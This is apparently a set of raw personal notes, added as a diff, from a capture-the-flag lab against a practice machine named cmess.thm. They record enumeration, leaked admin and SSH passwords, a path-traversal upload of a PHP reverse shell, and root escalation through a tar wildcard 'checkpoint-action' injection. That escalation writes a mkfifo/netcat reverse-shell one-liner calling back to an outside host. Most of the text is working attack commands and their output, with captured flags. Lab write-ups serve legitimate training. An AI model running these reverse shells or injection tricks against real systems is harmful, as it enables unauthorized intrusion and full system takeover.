@@ -1,0 +1,53 @@
+Date:Apr/08/2021
+Time:00:35
+
+└─$ gobuster dir -u http://10.10.36.252 -w /usr/share/wordlists/dirb/common.txt
+
+http://dev.cmess.thm/
+got this in wfuzz
+
+http://cmess.thm/admin
+username:andre@cmess.thm
+pass:KPFTN_f2yxe%
+
+https://www.cvedetails.com/cve/CVE-2019-16679/
+http://cmess.thm/admin/fm/?f=../
+upload php-reverse-shell.php
+└─$ rlwrap nc -lvnp 4444                                                  1 ⚙
+http://cmess.thm/assets/php-reverse-shell.php
+python3 -c "import pty;pty.spawn('/bin/bash')"
+export TERM=xterm
+www-data@cmess:/opt$ 
+cat .password.bak
+andres backup password
+UQfsdCB7aAP6
+
+└─$ ssh andre@cmess.thm                                                 130 ⨯
+andre@cmess:~$ cat user.txt
+thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
+
+andre@cmess:~/backup$ cat /etc/crontab
+andre@cmess:~/backup$ ls -la /tmp
+andre@cmess:~/backup$ date
+andre@cmess:~/backup$ echo "mkfifo /tmp/lhennp; nc 10.2.65.134 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
+andre@cmess:~/backup$ echo "" > "--checkpoint-action=exec=sh shell.sh"
+andre@cmess:~/backup$ echo "" > --checkpoint=1
+https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
+└─$ rlwrap nc -lvnp 8888                                                  1 ⚙
+listening on [any] 8888 ...
+connect to [10.2.65.134] from (UNKNOWN) [10.10.36.252] 43990
+id
+uid=0(root) gid=0(root) groups=0(root)
+python3 -c "import pty;pty.spawn('/bin/bash')"
+ls
+ls
+--checkpoint=1  --checkpoint-action=exec=sh shell.sh  note  shell.sh
+cd /root
+cd /root
+ls
+ls
+root.txt
+cat root.txt
+cat root.txt
+thm{9f85b7fdeb2cf96985bf5761a93546a2}
+
